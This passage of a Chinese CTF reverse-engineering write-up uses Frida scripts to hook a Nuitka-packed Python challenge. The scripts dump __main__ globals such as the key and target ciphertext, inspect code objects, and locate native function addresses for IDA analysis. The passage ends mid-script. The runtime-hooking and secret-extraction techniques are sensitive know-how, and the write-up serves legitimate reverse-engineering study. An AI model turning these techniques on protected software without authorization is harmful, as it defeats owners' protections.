    if (!aIsInit || !aGILE || !aImportAdd || !aGetDict || !aDictNext || !aGetAttr) {
        return false;
    }

    fnIsInit      = new NativeFunction(aIsInit,        "int",     []);
    fnGILE        = new NativeFunction(aGILE,          "int",     []);
    fnGILR        = new NativeFunction(aGILR,          "void",    ["int"]);
    fnImportAdd   = new NativeFunction(aImportAdd,     "pointer", ["pointer"]);
    fnImportMod   = aImportMod ? new NativeFunction(aImportMod, "pointer", ["pointer"]) : null;
    fnGetModuleDict = aGetModuleDict ? new NativeFunction(aGetModuleDict, "pointer", []) : null;
    fnGetDict     = new NativeFunction(aGetDict,       "pointer", ["pointer"]);
    fnDictGet     = aDictGet ? new NativeFunction(aDictGet, "pointer", ["pointer", "pointer"]) : null;
    fnDictNext    = new NativeFunction(aDictNext,      "int",     ["pointer","pointer","pointer","pointer"]);
    fnGetAttr     = new NativeFunction(aGetAttr,       "pointer", ["pointer","pointer"]);
    fnObjectType  = aObjectType ? new NativeFunction(aObjectType, "pointer", ["pointer"]) : null;
    fnUtf8        = aUtf8 ? new NativeFunction(aUtf8, "pointer", ["pointer"]) : null;
    fnBytes       = aBytes ? new NativeFunction(aBytes, "int", ["pointer","pointer","pointer"]) : null;
    fnTupleSize   = aTupleSize ? new NativeFunction(aTupleSize, "int64", ["pointer"]) : null;
    fnTupleGet    = aTupleGet ? new NativeFunction(aTupleGet, "pointer", ["pointer","int64"]) : null;
    fnErrClear    = aErrClear ? new NativeFunction(aErrClear, "void", []) : function(){};
    fnCallFn      = aCallFn ? new NativeFunction(aCallFn, "pointer",
                    ["pointer","pointer","pointer","pointer","pointer","pointer"]) : null;
    fnLong        = aLong ? new NativeFunction(aLong, "int64", ["pointer"]) : null;
    fnRepr        = aRepr ? new NativeFunction(aRepr, "pointer", ["pointer"]) : null;

    initialized = true;
    return true;
}

function safeAttr(obj, name) {
    if (!obj || obj.isNull()) return null;
    var r = fnGetAttr(obj, Memory.allocUtf8String(name));
    if (!r || r.isNull()) { fnErrClear(); return null; }
    return r;
}

function getStr(obj) {
    if (!obj || obj.isNull() || !fnUtf8) return null;
    var c = fnUtf8(obj);
    if (!c || c.isNull()) { fnErrClear(); return null; }
    return c.readCString();
}

function getBytes(obj) {
    if (!obj || obj.isNull() || !fnBytes) return null;
    var buf = Memory.alloc(Process.pointerSize);
    var len = Memory.alloc(8);
    if (fnBytes(obj, buf, len) !== 0) { fnErrClear(); return null; }
    var ptr = buf.readPointer();
    var n = len.readS64();
    if (!ptr || ptr.isNull() || n < 0 || n > 0x100000) return null;
    if (n === 0) return { bytes: new Uint8Array(0), len: 0, hex: "" };
    var arr = new Uint8Array(ptr.readByteArray(n));
    var hex = '';
    for (var i = 0; i < arr.length; i++) hex += ('0' + arr[i].toString(16)).slice(-2);
    return { bytes: arr, len: n, hex: hex };
}

function typeName(obj) {
    if (!obj || obj.isNull() || !fnObjectType) return null;
    var t = fnObjectType(obj);
    if (!t || t.isNull()) { fnErrClear(); return null; }
    var n = safeAttr(t, "__name__");
    if (!n) { fnErrClear(); return null; }
    return getStr(n);
}

// 遍历 dict，返回 [{k, v}, ...]
function dictIterate(dictPtr) {
    var out = [];
    if (!dictPtr || dictPtr.isNull() || !fnDictNext) return out;
    var pos = Memory.alloc(8);
    pos.writeS64(0);
    var kPtr = Memory.alloc(8);
    var vPtr = Memory.alloc(8);
    var safety = 0;
    while (fnDictNext(dictPtr, pos, kPtr, vPtr) !== 0) {
        if (++safety > 5000) break;
        out.push({ k: kPtr.readPointer(), v: vPtr.readPointer() });
    }
    return out;
}

// dump 一个 code object 的完整信息
function dumpCodeObject(label, codeObj) {
    if (!codeObj) { log("[" + label + "] code null"); return; }
    var coName = safeAttr(codeObj, "co_name");
    var coNameStr = coName ? getStr(coName) : "?";
    log("\n===== code object: " + label + " (co_name=" + coNameStr + ") =====");

    // co_varnames
    var varnames = safeAttr(codeObj, "co_varnames");
    if (varnames && fnTupleSize && fnTupleGet) {
        var n = Number(fnTupleSize(varnames));
        var arr = [];
        for (var i = 0; i < n; i++) {
            var it = fnTupleGet(varnames, i);
            arr.push(getStr(it));
        }
        log("  co_varnames(" + n + "): " + JSON.stringify(arr));
    }

    // co_names
    var names = safeAttr(codeObj, "co_names");
    if (names && fnTupleSize && fnTupleGet) {
        var n = Number(fnTupleSize(names));
        var arr = [];
        for (var i = 0; i < n; i++) {
            var it = fnTupleGet(names, i);
            arr.push(getStr(it));
        }
        log("  co_names(" + n + "): " + JSON.stringify(arr));
    }

    // co_consts
    var consts = safeAttr(codeObj, "co_consts");
    if (consts && fnTupleSize && fnTupleGet) {
        var n = Number(fnTupleSize(consts));
        log("  co_consts(" + n + "):");
        for (var i = 0; i < n; i++) {
            var item = fnTupleGet(consts, i);
            if (!item || item.isNull()) { log("    [" + i + "] <null>"); continue; }
            var tn = typeName(item);
            if (tn === "bytes") {
                var b = getBytes(item);
                if (b) { log("    [" + i + "] bytes(" + b.len + ") " + b.hex); continue; }
            }
            if (tn === "str") {
                var s = getStr(item);
                if (s !== null) { log("    [" + i + "] str " + JSON.stringify(s)); continue; }
            }
            if (tn === "int" && fnLong) {
                log("    [" + i + "] int " + Number(fnLong(item)));
                continue;
            }
            if (tn === "code") {
                var sn = safeAttr(item, "co_name");
                log("    [" + i + "] <code " + JSON.stringify(getStr(sn)) + ">");
                continue;
            }
            log("    [" + i + "] " + (tn || "?"));
        }
    }

    // co_code
    var coCode = safeAttr(codeObj, "co_code");
    if (coCode) {
        var b = getBytes(coCode);
        if (b) log("  co_code(" + b.len + "): " + b.hex);
    }

    // marshal.dumps 整个 code object 发给 Python 端保存
    if (fnCallFn && fnImportMod) {
        var marshalMod = fnImportMod(Memory.allocUtf8String("marshal"));
        if (marshalMod && !marshalMod.isNull()) {
            var dumps = safeAttr(marshalMod, "dumps");
            if (dumps) {
                var bytesObj = fnCallFn(dumps, codeObj, ptr(0), ptr(0), ptr(0), ptr(0));
                if (bytesObj && !bytesObj.isNull()) {
                    var mb = getBytes(bytesObj);
                    if (mb) {
                        var safeName = String(label).replace(/[^\w.-]/g, "_");
                        send({ type: "code_object", name: safeName, size: mb.len }, mb.bytes.buffer);
                    }
                } else { fnErrClear(); }
            }
        }
    }
}

// dump 一个 dict（比如 __main__.__dict__）
function dumpModuleDict(label, dictPtr, opts) {
    opts = opts || { skipDunder: true };
    var entries = dictIterate(dictPtr);
    log("\n########## [" + label + "] " + entries.length + " entries ##########");
    for (var e of entries) {
        var keyStr = getStr(e.k);
        if (keyStr === null) keyStr = "<non-str-key>";
        if (opts.skipDunder && keyStr.startsWith("__") && keyStr.endsWith("__")) continue;

        var tn = typeName(e.v) || "?";

        if (tn === "function") {
            log("  " + keyStr + " : function");
            var codeObj = safeAttr(e.v, "__code__");
            dumpCodeObject(keyStr, codeObj);
        } else if (tn === "builtin_function_or_method") {
            log("  " + keyStr + " : builtin_function_or_method");
        } else if (tn === "bytes") {
            var b = getBytes(e.v);
            if (b) log("  " + keyStr + " : bytes(" + b.len + ") " + b.hex);
        } else if (tn === "bytearray") {
            var b2 = getBytes(e.v);
            if (b2) log("  " + keyStr + " : bytearray(" + b2.len + ") " + b2.hex);
        } else if (tn === "str") {
            var s = getStr(e.v);
            if (s !== null) log("  " + keyStr + " : str " + JSON.stringify(s));
        } else if (tn === "int" && fnLong) {
            log("  " + keyStr + " : int " + Number(fnLong(e.v)));
        } else if (tn === "type") {
            log("  " + keyStr + " : type(class)");
        } else if (tn === "module") {
            log("  " + keyStr + " : module");
        } else {
            log("  " + keyStr + " : " + tn);
        }
    }
}

function tryInstall() {
    if (done) return;
    var mod = Process.findModuleByName(DLL);
    if (!mod) return;
    if (!initFunctions(mod)) { done = true; return; }

    if (fnIsInit() === 0) return;

    var gil = fnGILE();
    try {
        log("[*] GIL acquired, dumping ...");

        // 1) 打印所有已加载模块名（sys.modules）
        if (fnGetModuleDict) {
            var sysMods = fnGetModuleDict();
            if (sysMods && !sysMods.isNull()) {
                var entries = dictIterate(sysMods);
                var names = [];
                for (var e of entries) {
                    var s = getStr(e.k);
                    if (s) names.push(s);
                }
                log("[sys.modules] " + names.length + " modules: " + JSON.stringify(names));
            }
        }

        // 2) dump __main__.__dict__
        var mainMod = fnImportAdd(Memory.allocUtf8String("__main__"));
        if (mainMod && !mainMod.isNull()) {
            var mainDict = fnGetDict(mainMod);
            if (mainDict && !mainDict.isNull()) {
                dumpModuleDict("__main__", mainDict, { skipDunder: true });
            }
        } else { fnErrClear(); }

        // 3) 试试 os 模块（很多 Nuitka 混淆会把东西塞进 os）
        var osMod = fnImportAdd(Memory.allocUtf8String("os"));
        if (osMod && !osMod.isNull()) {
            var osDict = fnGetDict(osMod);
            if (osDict && !osDict.isNull()) {
                dumpModuleDict("os", osDict, { skipDunder: true });
            }
        } else { fnErrClear(); }

        done = true;
    } catch (e) {
        log("[-] exception: " + e);
        fnErrClear();
    } finally {
        fnGILR(gil);
    }
}

setInterval(tryInstall, 500);
```

输出非常多，这里会遍历全部的全局模块，我这里只提取 main 中的内容：

```txt
########## [**main**] 15 entries ##########
[JS]   KEY : bytes(8) 733466654b657921
[JS]   TARGET : bytes(24) 499ea0a2c4c7e3617ecfe4f6286288d6025e6279b1bdcd17
[JS]   warehouse_transform : compiled_function
[JS]   check_flag : compiled_function
[JS]   main : compiled_function
[JS]
```

这里我们得到了极其关键的内容，这个模块中含有两个全局变量 KEY 和 TARGET，应该就是密钥和密文。

同时还发现了暴露在全局的两个函数 `check_flag` 和 `warehouse_transform` 。

这里我们可以猜测可能 check 函数中会对输入预处理然后调用 transform 函数加密最后与 target 比较。

现在我们最想看到的就是这两个 object 的字段信息。

frida 脚本如下：

```js
// fwh_dump2.js
var DLL = "python312.dll";
var done = false;
var initialized = false;

function log(s) { try { send({ m: String(s) }); } catch (e) { } }

var fnIsInit, fnGILE, fnGILR, fnImportAdd, fnGetDict, fnGetAttr,
    fnUtf8, fnBytes, fnTupleSize, fnTupleGet, fnErrClear, fnCallFn,
    fnImportMod, fnLong, fnObjectType, fnRepr;

function initFunctions(mod) {
    if (initialized) return true;
    function ex(n) { return mod.findExportByName(n); }
    var a = {
        IsInit: ex("Py_IsInitialized"),
        GILE: ex("PyGILState_Ensure"),
        GILR: ex("PyGILState_Release"),
        ImportAdd: ex("PyImport_AddModule"),
        GetDict: ex("PyModule_GetDict"),
        GetAttr: ex("PyObject_GetAttrString"),
        Utf8: ex("PyUnicode_AsUTF8"),
        Bytes: ex("PyBytes_AsStringAndSize"),
        TupleSize: ex("PyTuple_Size"),
        TupleGet: ex("PyTuple_GetItem"),
        ErrClear: ex("PyErr_Clear"),
        CallFn: ex("PyObject_CallFunctionObjArgs"),
        ImportMod: ex("PyImport_ImportModule"),
        Long: ex("PyLong_AsLongLong"),
        ObjType: ex("PyObject_Type"),
        Repr: ex("PyObject_Repr"),
    };
    if (!a.IsInit || !a.GILE || !a.ImportAdd || !a.GetDict || !a.GetAttr) return false;
    fnIsInit = new NativeFunction(a.IsInit, "int", []);
    fnGILE = new NativeFunction(a.GILE, "int", []);
    fnGILR = new NativeFunction(a.GILR, "void", ["int"]);
    fnImportAdd = new NativeFunction(a.ImportAdd, "pointer", ["pointer"]);
    fnGetDict = new NativeFunction(a.GetDict, "pointer", ["pointer"]);
    fnGetAttr = new NativeFunction(a.GetAttr, "pointer", ["pointer", "pointer"]);
    fnUtf8 = new NativeFunction(a.Utf8, "pointer", ["pointer"]);
    fnBytes = new NativeFunction(a.Bytes, "int", ["pointer", "pointer", "pointer"]);
    fnTupleSize = new NativeFunction(a.TupleSize, "int64", ["pointer"]);
    fnTupleGet = new NativeFunction(a.TupleGet, "pointer", ["pointer", "int64"]);
    fnErrClear = new NativeFunction(a.ErrClear, "void", []);
    fnCallFn = new NativeFunction(a.CallFn, "pointer", ["pointer", "pointer", "pointer", "pointer", "pointer", "pointer"]);
    fnImportMod = new NativeFunction(a.ImportMod, "pointer", ["pointer"]);
    fnLong = new NativeFunction(a.Long, "int64", ["pointer"]);
    fnObjectType = new NativeFunction(a.ObjType, "pointer", ["pointer"]);
    fnRepr = new NativeFunction(a.Repr, "pointer", ["pointer"]);
    initialized = true;
    return true;
}

function safeAttr(o, n) {
    if (!o || o.isNull()) return null;
    var r = fnGetAttr(o, Memory.allocUtf8String(n));
    if (!r || r.isNull()) { fnErrClear(); return null; }
    return r;
}
function getStr(o) {
    if (!o || o.isNull()) return null;
    var c = fnUtf8(o); if (!c || c.isNull()) { fnErrClear(); return null; }
    return c.readCString();
}
function getBytes(o) {
    if (!o || o.isNull()) return null;
    var buf = Memory.alloc(8), len = Memory.alloc(8);
    if (fnBytes(o, buf, len) !== 0) { fnErrClear(); return null; }
    var p = buf.readPointer(), n = len.readS64();
    if (!p || p.isNull() || n < 0 || n > 0x100000) return null;
    if (n === 0) return { bytes: new Uint8Array(0), len: 0, hex: "" };
    var arr = new Uint8Array(p.readByteArray(n));
    var hex = ''; for (var i = 0; i < arr.length; i++) hex += ('0' + arr[i].toString(16)).slice(-2);
    return { bytes: arr, len: n, hex: hex };
}
function typeName(o) {
    if (!o || o.isNull()) return null;
    var t = fnObjectType(o); if (!t || t.isNull()) { fnErrClear(); return null; }
    var n = safeAttr(t, "__name__"); if (!n) { fnErrClear(); return null; }
    return getStr(n);
}

function dumpCode(label, fnObj) {
    log("\n===== " + label + " =====");
    var tn = typeName(fnObj);
    log("  type = " + tn);
    // __name__
    var nameObj = safeAttr(fnObj, "__name__");
    if (nameObj) log("  __name__ = " + JSON.stringify(getStr(nameObj)));
    // 尝试 __code__
    var codeObj = safeAttr(fnObj, "__code__");
    if (!codeObj) {
        log("  __code__ = NULL (纯C编译函数)");
        // 试试 __doc__
        var docObj = safeAttr(fnObj, "__doc__");
        if (docObj) log("  __doc__ = " + JSON.stringify(getStr(docObj)));
        return;
    }
    // co_name
    var coName = safeAttr(codeObj, "co_name");
    if (coName) log("  co_name = " + JSON.stringify(getStr(coName)));
    // co_varnames
    var vn = safeAttr(codeObj, "co_varnames");
    if (vn) {
        var n = Number(fnTupleSize(vn)); var arr = [];
        for (var i = 0; i < n; i++) arr.push(getStr(fnTupleGet(vn, i)));
        log("  co_varnames(" + n + "): " + JSON.stringify(arr));
    }
    // co_names
    var nm = safeAttr(codeObj, "co_names");
    if (nm) {
        var n = Number(fnTupleSize(nm)); var arr = [];
        for (var i = 0; i < n; i++) arr.push(getStr(fnTupleGet(nm, i)));
        log("  co_names(" + n + "): " + JSON.stringify(arr));
    }
    // co_consts
    var cs = safeAttr(codeObj, "co_consts");
    if (cs) {
        var n = Number(fnTupleSize(cs));
        log("  co_consts(" + n + "):");
        for (var i = 0; i < n; i++) {
            var it = fnTupleGet(cs, i);
            if (!it || it.isNull()) { log("    [" + i + "] <null>"); continue; }
            var t = typeName(it);
            if (t === "bytes") {
                var b = getBytes(it);
                if (b) { log("    [" + i + "] bytes(" + b.len + ") " + b.hex); continue; }
            }
            if (t === "str") {
                var s = getStr(it);
                if (s !== null) { log("    [" + i + "] str " + JSON.stringify(s)); continue; }
            }
            if (t === "int") {
                log("    [" + i + "] int " + Number(fnLong(it))); continue;
            }
            if (t === "code") {
                var sn = safeAttr(it, "co_name");
                log("    [" + i + "] <code " + JSON.stringify(getStr(sn)) + ">");
                continue;
            }
            log("    [" + i + "] " + t);
        }
    }
    // co_code
    var cc = safeAttr(codeObj, "co_code");
    if (cc) {
        var b = getBytes(cc);
        if (b) log("  co_code(" + b.len + "): " + b.hex);
    }
    // marshal.dumps
    var mm = fnImportMod(Memory.allocUtf8String("marshal"));
    if (mm) {
        var dumps = safeAttr(mm, "dumps");
        if (dumps) {
            var bo = fnCallFn(dumps, codeObj, ptr(0), ptr(0), ptr(0), ptr(0));
            if (bo && !bo.isNull()) {
                var mb = getBytes(bo);
                if (mb) {
                    send({ type: "code_object", name: label, size: mb.len }, mb.bytes.buffer);
                }
            } else { fnErrClear(); }
        }
    }
}

function tryInstall() {
    if (done) return;
    var mod = Process.findModuleByName(DLL);
    if (!mod) return;
    if (!initFunctions(mod)) { done = true; return; }
    if (fnIsInit() === 0) return;

    var gil = fnGILE();
    try {
        var mainMod = fnImportAdd(Memory.allocUtf8String("__main__"));
        if (!mainMod || mainMod.isNull()) { fnErrClear(); return; }
        var mainDict = fnGetDict(mainMod);
        if (!mainDict || mainDict.isNull()) { fnErrClear(); return; }

        var targets = ["warehouse_transform", "check_flag", "main"];
        var foundAny = false;
        for (var name of targets) {
            var f = safeAttr(mainMod, name);   // 用 module.__getattr__ 走 __dict__
            if (!f) {
                var nk = Memory.allocUtf8String(name);
                // 退路：PyDict_GetItemString
                var dictGet = mod.findExportByName("PyDict_GetItemString");
                if (dictGet) {
                    var dg = new NativeFunction(dictGet, "pointer", ["pointer", "pointer"]);
                    f = dg(mainDict, nk);
                    if (f && f.isNull()) f = null;
                }
            }
            if (f) {
                foundAny = true;
                dumpCode(name, f);
            } else {
                log("\n[-] " + name + " not found in __main__");
            }
        }
        if (foundAny) done = true;
    } catch (e) {
        log("[-] exception: " + e);
        fnErrClear();
    } finally {
        fnGILR(gil);
    }
}

setInterval(tryInstall, 500);
```

输出如下：

```txt
===== warehouse_transform =====
[JS]   type = compiled_function
[JS]   __name__ = "warehouse_transform"
[JS]   co_name = "warehouse_transform"
[JS]   co_varnames(6): ["data","ordered","out","prev","i","value"]
[JS]   co_names(1): ["RuntimeError"]
[JS]   co_consts(2):
[JS]     [0] NoneType
[JS]     [1] str "Compiled function bytecode used"
[JS]   co_code(24): 9700740100000000000000006401ab010000000000008201
[+] saved dumped_code_objects\warehouse_transform.pyc (278 bytes)
    co_name      = 'warehouse_transform'
    co_code_len  = 24
    co_names     = ['RuntimeError']
    co_varnames  = ['data', 'ordered', 'out', 'prev', 'i', 'value']
    co_consts    =
      [0] NoneType None
      [1] str  'Compiled function bytecode used'

--- dis.dis(warehouse_transform) ---
  4           CALL_KW                  0
              CACHE
              CACHE
              POP_JUMP_IF_FALSE        1 (to L1)
              CACHE
      L1:     CACHE
              CACHE
              BINARY_OP                1 (&)
--- end dis ---

[JS]
===== check_flag =====
[JS]   type = compiled_function
[JS]   __name__ = "check_flag"
[JS]   co_name = "check_flag"
[JS]   co_varnames(1): ["text"]
[JS]   co_names(1): ["RuntimeError"]
[JS]   co_consts(2):
[JS]     [0] NoneType
[JS]     [1] str "Compiled function bytecode used"
[JS]   co_code(24): 9700740100000000000000006401ab010000000000008201
[+] saved dumped_code_objects\check_flag.pyc (234 bytes)
    co_name      = 'check_flag'
    co_code_len  = 24
    co_names     = ['RuntimeError']
    co_varnames  = ['text']
    co_consts    =
      [0] NoneType None
      [1] str  'Compiled function bytecode used'

--- dis.dis(check_flag) ---
 11           CALL_KW                  0
              CACHE
              CACHE
              POP_JUMP_IF_FALSE        1 (to L1)
              CACHE
      L1:     CACHE
              CACHE
              BINARY_OP                1 (&)
--- end dis ---

[JS]
===== main =====
[JS]   type = compiled_function
[JS]   __name__ = "main"
[JS]   co_name = "main"
[JS]   co_varnames(1): ["text"]
[JS]   co_names(1): ["RuntimeError"]
[JS]   co_consts(2):
[JS]     [0] NoneType
[JS]     [1] str "Compiled function bytecode used"
[JS]   co_code(24): 9700740100000000000000006401ab010000000000008201
[+] saved dumped_code_objects\main.pyc (228 bytes)
    co_name      = 'main'
    co_code_len  = 24
```

在这里我们无法通过这些 co_object 的 co_code 字段获取到字节码。

毕竟是 nutika 打包的，理论上是不会存在字节码的。

但是这的局部变量给了我们更多的信息，可以看到 main 函数 和 check 函数极其简单，就只有一个局部变量和异常。

同时 transform 函数加密逻辑需要的变量名泄露了，这对我们的分析也会有很大帮助。

既然现在的目标已经明确，由于 nutika 想要劫持函数调用到 native ，那么它就一定需要暴露一个指针到运行时，以供调用，而通过这个地址减去基址我们就可以得到这三个函数的 rva 了。

然后我们就可以尝试在 ida 中进行分析了。

frida 脚本如下：

```js
var DLL = "python312.dll";
var TARGET_MODULE = "challenge.dll";
var done = false;
var initialized = false;

function log(s) { try { send({ m: String(s) }); } catch (e) { } }

// ---------- C API 函数指针 ----------
var fnIsInit, fnGILE, fnGILR, fnImportAdd, fnGetAttr, fnUtf8, fnBytes,
    fnErrClear, fnCallFn, fnLong, fnObjType, fnFromStr, fnBytesNew,
    fnErrFetch, fnErrNormalize, fnObjRepr, fnListNew, fnListSetItem,
    fnLongFromLong, fnDictNext, fnGetModuleDict;

function initFunctions(mod) {
    if (initialized) return true;
    function ex(n) { return mod.findExportByName(n); }
    var a = {
        IsInit:     ex("Py_IsInitialized"),
        GILE:       ex("PyGILState_Ensure"),
        GILR:       ex("PyGILState_Release"),
        ImportAdd:  ex("PyImport_AddModule"),
        ImportMod:  ex("PyImport_ImportModule"),
        GetModuleDict: ex("PyImport_GetModuleDict"),
        GetAttr:    ex("PyObject_GetAttrString"),
        Utf8:       ex("PyUnicode_AsUTF8"),
        Bytes:      ex("PyBytes_AsStringAndSize"),
        BytesNew:   ex("PyBytes_FromStringAndSize"),
        ErrClear:   ex("PyErr_Clear"),
        CallFn:     ex("PyObject_CallFunctionObjArgs"),
        Long:       ex("PyLong_AsLongLong"),
        ObjType:    ex("PyObject_Type"),
        FromStr:    ex("PyUnicode_FromString"),
        ErrFetch:   ex("PyErr_Fetch"),
        ErrNorm:    ex("PyErr_NormalizeException"),
        ObjRepr:    ex("PyObject_Repr"),
        ListNew:    ex("PyList_New"),
        ListSet:    ex("PyList_SetItem"),
        LongFromL:  ex("PyLong_FromLong"),
        DictNext:   ex("PyDict_Next"),
    };
    if (!a.IsInit || !a.GILE || !a.ImportAdd || !a.GetAttr) return false;

    fnIsInit    = new NativeFunction(a.IsInit,    "int", []);
    fnGILE      = new NativeFunction(a.GILE,      "int", []);
    fnGILR      = new NativeFunction(a.GILR,      "void", ["int"]);
    fnImportAdd = new NativeFunction(a.ImportAdd, "pointer", ["pointer"]);
    fnGetAttr   = new NativeFunction(a.GetAttr,   "pointer", ["pointer","pointer"]);
    fnUtf8      = new NativeFunction(a.Utf8,      "pointer", ["pointer"]);
    fnBytes     = new NativeFunction(a.Bytes,     "int", ["pointer","pointer","pointer"]);
    fnErrClear  = new NativeFunction(a.ErrClear,  "void", []);
    fnCallFn    = new NativeFunction(a.CallFn,    "pointer", ["pointer","pointer","pointer","pointer","pointer","pointer"]);
    fnLong      = new NativeFunction(a.Long,      "int64", ["pointer"]);
    fnObjType   = new NativeFunction(a.ObjType,   "pointer", ["pointer"]);
    fnFromStr   = new NativeFunction(a.FromStr,   "pointer", ["pointer"]);
    if (a.BytesNew)   fnBytesNew  = new NativeFunction(a.BytesNew,  "pointer", ["pointer","int64"]);
    if (a.ErrFetch)   fnErrFetch  = new NativeFunction(a.ErrFetch,  "void", ["pointer","pointer","pointer"]);
    if (a.ErrNorm)    fnErrNormalize = new NativeFunction(a.ErrNorm, "void", ["pointer","pointer","pointer"]);
    if (a.ObjRepr)    fnObjRepr   = new NativeFunction(a.ObjRepr,   "pointer", ["pointer"]);
    if (a.ListNew)    fnListNew   = new NativeFunction(a.ListNew,   "pointer", ["int64"]);
    if (a.ListSet)    fnListSetItem = new NativeFunction(a.ListSet, "int", ["pointer","int64","pointer"]);
    if (a.LongFromL)  fnLongFromLong = new NativeFunction(a.LongFromL, "pointer", ["int"]);
    if (a.DictNext)   fnDictNext  = new NativeFunction(a.DictNext,  "int", ["pointer","pointer","pointer","pointer"]);
    if (a.GetModuleDict) fnGetModuleDict = new NativeFunction(a.GetModuleDict, "pointer", []);
    initialized = true;
    return true;
}

// ---------- 辅助 ----------
function safeAttr(o, n) {
    if (!o || o.isNull()) return null;
    var r = fnGetAttr(o, Memory.allocUtf8String(n));
    if (!r || r.isNull()) { fnErrClear(); return null; }
    return r;
}
function getStr(o) {
    if (!o || o.isNull()) return null;
    var c = fnUtf8(o); if (!c || c.isNull()) { fnErrClear(); return null; }
    return c.readCString();
}
function getBytes(o) {
    if (!o || o.isNull()) return null;
    var buf = Memory.alloc(8), len = Memory.alloc(8);
    if (fnBytes(o, buf, len) !== 0) { fnErrClear(); return null; }
    var p = buf.readPointer(), n = len.readS64();
    if (!p || p.isNull() || n < 0 || n > 0x100000) return null;
    if (n === 0) return { bytes: new Uint8Array(0), len: 0, hex: "" };
    var arr = new Uint8Array(p.readByteArray(n));
    var hex = ''; for (var i=0;i<arr.length;i++) hex += ('0'+arr[i].toString(16)).slice(-2);
    return { bytes: arr, len: n, hex: hex };
}
function typeName(o) {
    if (!o || o.isNull()) return null;
    var t = fnObjType(o); if (!t || t.isNull()) { fnErrClear(); return null; }
    var n = fnGetAttr(t, Memory.allocUtf8String("__name__"));
    if (!n || n.isNull()) { fnErrClear(); return null; }
    return getStr(n);
}

// 判断前 8 字节是否像函数 prologue
function looksLikePrologue(u8) {
    if (u8.length < 4) return false;
    // x64 常见 prologue：
    //   55                push rbp
    //   48 89 5c 24 XX    mov [rsp+XX], rbx
    //   48 83 ec XX       sub rsp, XX
    //   48 89 4c 24 08    mov [rsp+8], rcx
    //   48 89 54 24 10    mov [rsp+10], rdx
    //   40 53             push rbx (REX)
    //   40 55             push rbp (REX)
    //   41 54/55/56/57    push r12-r15
    var b = u8;
    if (b[0] === 0x55) return true;
    if (b[0] === 0x48 && (b[1] === 0x89 || b[1] === 0x83 || b[1] === 0x8b)) return true;
    if (b[0] === 0x40 && (b[1] === 0x53 || b[1] === 0x55 || b[1] === 0x56 || b[1] === 0x57)) return true;
    if (b[0] === 0x41 && (b[1] === 0x54 || b[1] === 0x55 || b[1] === 0x56 || b[1] === 0x57)) return true;
    if (b[0] === 0x53 || b[0] === 0x56 || b[0] === 0x57) return true;
    if (b[0] === 0x4c && b[1] === 0x8b && (b[2] === 0xdc || b[2] === 0xd9)) return true;
    return false;
}

// ---------- 核心：dump 一个 compiled_function 的所有 challenge.dll 指针 ----------
function findImplRVA(label, funcObj) {
    if (!funcObj || funcObj.isNull()) { log("\n[" + label + "] NULL object"); return null; }

    var challMod = Process.findModuleByName(TARGET_MODULE);
    if (!challMod) { log("[-] " + TARGET_MODULE + " not loaded"); return null; }
    var base = challMod.base;
    var size = challMod.size;
    var end = base.add(size);

    var pyMod = Process.findModuleByName(DLL);
    var pyBase = pyMod ? pyMod.base : null;
    var pyEnd = pyMod ? pyMod.base.add(pyMod.size) : null;

    log("\n========== [" + label + "] ==========");
    log("  obj @ " + funcObj + "  type = " + typeName(funcObj));
    log("  " + TARGET_MODULE + " @ " + base + "  size=0x" + size.toString(16) + "  (range " + base + " .. " + end + ")");
    if (pyBase) log("  " + DLL + " @ " + pyBase + "  size=0x" + pyMod.size.toString(16));

    var hits = [];
    for (var off = 0; off < 0x300; off += 8) {
        var v;
        try { v = funcObj.add(off).readPointer(); } catch (e) { break; }
        if (v.isNull()) continue;

        var tag = "", note = "";
        if (v.compare(base) >= 0 && v.compare(end) < 0) {
            var rva = v.sub(base).toInt32();
            var prohex = "??", u8 = null;
            try {
                u8 = new Uint8Array(v.readByteArray(8));
                prohex = Array.from(u8).map(b => ('0'+b.toString(16)).slice(-2)).join(' ');
            } catch (e) { prohex = "<unreadable>"; }

            if (u8 && looksLikePrologue(u8)) {
                tag = "★★★ [FUNC?]";
                note = "  ← 可能是 m_impl";
            } else {
                tag = " ★ [data]";
            }
            hits.push({ off: off, rva: rva, ptr: v, pro: prohex, isFunc: !!(u8 && looksLikePrologue(u8)) });
            log("  +0x" + off.toString(16).padStart(3,'0') + ": " + v +
                "   " + TARGET_MODULE + "+0x" + rva.toString(16) + "   bytes=[" + prohex + "]  " + tag + note);
        } else if (pyBase && v.compare(pyBase) >= 0 && v.compare(pyEnd) < 0) {
            log("  +0x" + off.toString(16).padStart(3,'0') + ": " + v +
                "   [" + DLL + "+0x" + v.sub(pyBase).toString(16) + "]");
        } else {
            log("  +0x" + off.toString(16).padStart(3,'0') + ": " + v + "   [other]");
        }
    }

    log("  → " + hits.length + " 个 " + TARGET_MODULE + " 指针");
    var funcs = hits.filter(h => h.isFunc);
    if (funcs.length > 0) {
        log("  → 推荐 m_impl:");
        for (var h of funcs) {
            log("      " + TARGET_MODULE + "+0x" + h.rva.toString(16) +
                "  = IDA 0x3530C" + h.rva.toString(16).padStart(4,'0'));
        }
    } else {
        log("  → 未找到函数 prologue 特征");
    }
    return funcs.length ? funcs[0].rva : null;
}

// ---------- 通用 dict 遍历（备用：从 sys.modules 找 __main__） ----------
function dictIterate(dictPtr) {
    var out = [];
    if (!dictPtr || dictPtr.isNull() || !fnDictNext) return out;
    var pos = Memory.alloc(8); pos.writeS64(0);
    var kP = Memory.alloc(8), vP = Memory.alloc(8);
    var safety = 0;
    while (fnDictNext(dictPtr, pos, kP, vP) !== 0) {
        if (++safety > 5000) break;
        out.push({ k: kP.readPointer(), v: vP.readPointer() });
    }
    return out;
}

// ---------- 主流程 ----------
function tryInstall() {
    if (done) return;
    var mod = Process.findModuleByName(DLL);
    if (!mod) return;
    if (!initFunctions(mod)) { done = true; return; }
    if (fnIsInit() === 0) return;

    var gil = fnGILE();
    try {
        var mainMod = fnImportAdd(Memory.allocUtf8String("__main__"));
        if (!mainMod || mainMod.isNull()) { fnErrClear(); return; }

        var funcWT = safeAttr(mainMod, "warehouse_transform");
        var funcCF = safeAttr(mainMod, "check_flag");
        var funcMain = safeAttr(mainMod, "main");
        var keyObj = safeAttr(mainMod, "KEY");
        var targetObj = safeAttr(mainMod, "TARGET");

        // 还没定义好，下一轮再试
        if (!funcWT) {
            fnErrClear();
            return;
        }
        done = true;

        if (keyObj) {
            var kb = getBytes(keyObj);
            if (kb) log("[+] KEY = " + kb.hex + "  (" + kb.len + "B)");
        }
        if (targetObj) {
            var tb = getBytes(targetObj);
            if (tb) log("[+] TARGET = " + tb.hex + "  (" + tb.len + "B)");
        }

